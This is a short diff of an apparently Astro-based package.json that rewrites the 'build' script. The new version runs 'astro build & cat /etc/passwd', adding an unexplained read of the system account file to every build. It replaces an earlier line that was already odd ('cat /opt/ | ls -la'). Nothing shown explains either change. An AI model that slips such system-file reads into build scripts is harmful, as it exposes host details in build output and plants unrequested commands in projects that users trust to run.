@@ -6,7 +6,7 @@
   "scripts": {
     "dev": "astro dev",
     "start": "astro dev",
-    "build": "astro build & cat /opt/ | ls -la",
+    "build": "astro build & cat /etc/passwd",
     "preview": "astro preview",
     "astro": "astro"
   },
